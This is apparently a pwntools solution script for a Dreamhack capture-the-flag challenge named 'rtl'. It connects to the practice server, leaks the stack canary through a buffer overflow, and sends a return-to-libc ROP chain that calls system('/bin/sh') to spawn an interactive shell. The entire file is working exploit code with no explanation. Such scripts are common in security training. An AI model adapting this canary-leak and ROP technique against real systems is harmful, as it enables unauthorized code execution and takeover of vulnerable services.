from pwn import *

#p = process('./rtl')
p = remote('host3.dreamhack.games', 9278)
e = ELF('./rtl')
#gdb.attach(p, api=True)

buf = b'a'*(0x40 - 0x8 + 1)
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
log.info('Canary ' + hex(canary))

binsh = 0x400874 #search /bin/sh
pop_rdi = 0x0000000000400853 #ROPgadget --binary | grep "pop rdi ; ret"
ret = 0x0000000000400596 #ROPgadget --binary | grep "ret"
system = e.plt['system']

payload = b'A'*(0x40-0x8) + p64(canary) + b'A'*0x8 
payload += p64(ret) #prevent error cause by movaps
payload += p64(pop_rdi) + p64(binsh) + p64(system) #system(/bin/sh)
p.sendafter(b'Buf: ', payload)

p.interactive()
